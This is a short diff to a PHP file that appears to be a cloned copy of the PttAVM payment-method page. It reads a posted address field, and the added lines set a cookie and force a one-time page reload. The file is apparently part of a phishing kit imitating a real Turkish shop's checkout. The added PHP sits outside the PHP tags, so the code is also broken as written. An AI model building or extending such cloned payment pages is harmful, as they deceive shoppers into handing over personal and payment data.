@@ -15,6 +15,13 @@ $adres = $_POST['adres'] ?? '';
 ?>
 <!-- saved from url=(0042)https://www.pttavm.com/my/tr/odeme-yontemi -->
 <html lang="tr">
+
+	if($_COOKIE['Yenile']!="1"){
+setcookie("Yenile", "1", time() + (60*60*24));
+echo "<script>setTimeout(function(){location.reload()},5000)</script>";
+};
+
+	
   <link data-n-head="ssr" rel="icon" type="image/png" href="https://www.pttavm.com/favicon.ico" />
   <script type="text/javascript" async="" src="assets/recaptcha__tr.js.indir" crossorigin="anonymous" integrity="sha384-4DVXT62jXQ59y3QtQPt5K//bRgqmSFZIwB+H38o+PpAXluieQ3YJ1vbjCTsrXkDv"></script>
   <script type="text/javascript" async="" src="assets/recaptcha__tr.js.indir" crossorigin="anonymous" integrity="sha384-4DVXT62jXQ59y3QtQPt5K//bRgqmSFZIwB+H38o+PpAXluieQ3YJ1vbjCTsrXkDv"></script>
